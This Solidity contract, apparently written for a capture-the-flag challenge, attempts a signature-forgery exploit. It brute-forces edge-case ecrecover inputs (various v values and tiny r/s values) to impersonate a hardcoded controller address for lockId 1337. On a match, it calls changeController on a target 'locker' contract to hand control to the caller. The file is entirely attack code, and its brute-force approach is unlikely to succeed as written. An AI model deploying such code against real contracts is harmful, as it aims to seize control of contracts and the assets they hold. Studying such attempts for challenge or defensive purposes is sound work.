// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract EcrecoverExploit {
    // Test ecrecover with edge cases
    function testEcrecover(bytes32 msgHash, uint8 v, bytes32 r, bytes32 s) external pure returns (address) {
        return ecrecover(msgHash, v, r, s);
    }
    
    // Get the message hash for lockId 1337
    function getMsgHash() external pure returns (bytes32) {
        bytes32 msgHash;
        assembly {
            mstore(0x00, "\x19Ethereum Signed Message:\n32")
            mstore(0x1C, 1337)
            msgHash := keccak256(0x00, 0x3c)
        }
        return msgHash;
    }
    
    // Try to find values that make ecrecover return the target controller
    function findSignature(address target) external view returns (bool found, uint8 v, bytes32 r, bytes32 s) {
        bytes32 msgHash = this.getMsgHash();
        
        // Try some edge cases that might make ecrecover return specific addresses
        
        // Edge case 1: v=0, r=0, s=0 might return address(0)
        if (ecrecover(msgHash, 0, bytes32(0), bytes32(0)) == target) {
            return (true, 0, bytes32(0), bytes32(0));
        }
        
        // Edge case 2: Invalid v values
        for (uint8 i = 0; i < 30; i++) {
            if (ecrecover(msgHash, i, bytes32(uint256(1)), bytes32(uint256(1))) == target) {
                return (true, i, bytes32(uint256(1)), bytes32(uint256(1)));
            }
        }
        
        // Edge case 3: Special r,s values
        if (ecrecover(msgHash, 27, bytes32(0), bytes32(uint256(1))) == target) {
            return (true, 27, bytes32(0), bytes32(uint256(1)));
        }
        if (ecrecover(msgHash, 28, bytes32(0), bytes32(uint256(1))) == target) {
            return (true, 28, bytes32(0), bytes32(uint256(1)));
        }
        
        return (false, 0, bytes32(0), bytes32(0));
    }
    
    // Direct exploit attempt
    function exploit(address locker) external {
        // Try various signatures to change controller
        bytes32 msgHash = this.getMsgHash();
        
        // The target controller is 0x42069d82D9592991704e6E41BF2589a76eAd1A91
        address target = 0x42069d82D9592991704e6E41BF2589a76eAd1A91;
        
        // Try edge cases
        for (uint8 v = 0; v < 30; v++) {
            for (uint256 i = 0; i < 10; i++) {
                address recovered = ecrecover(msgHash, v, bytes32(i), bytes32(i));
                if (recovered == target) {
                    // Found it! Try to use it
                    (bool success,) = locker.call(
                        abi.encodeWithSignature(
                            "changeController(uint8,bytes32,bytes32,address)",
                            v, bytes32(i), bytes32(i), msg.sender
                        )
                    );
                    if (success) return;
                }
            }
        }
    }
}